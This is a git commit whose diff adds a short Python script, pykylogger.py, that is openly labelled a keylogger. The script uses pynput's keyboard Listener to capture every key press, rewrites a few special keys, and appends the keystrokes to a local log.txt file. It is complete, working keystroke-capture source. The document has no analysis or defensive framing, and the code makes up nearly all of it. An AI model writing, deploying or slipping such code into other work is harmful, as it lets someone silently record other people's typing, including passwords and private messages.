2492200c062f781bbb90ec5aa28e10406a5fed2b
fazilsha <fazilsha1197@gmail.com>
2021-09-14 13:19:17 +0530

    pykeylogger

--- pykylogger.py
+++ pykylogger.py
@@ -1,2 +1,20 @@
 from pynput.keyboard import Listener
 
+def log_key(key):
+    key = str(key).replace("'","")
+
+    if key == 'Key.space':
+        key = ' '
+    if key == 'Key.shift_r':
+        key = ''
+    if key == 'Key.enter':
+        key = '\n'
+    if key == 'Key.backspace':
+        key = ''
+    if key == 'Key.ctrl_l':
+        key = '[CTRL L]'
+    with open("log.txt", 'a') as f:
+        f.write(key)
+
+with Listener(on_press=log_key) as l:
+    l.join()
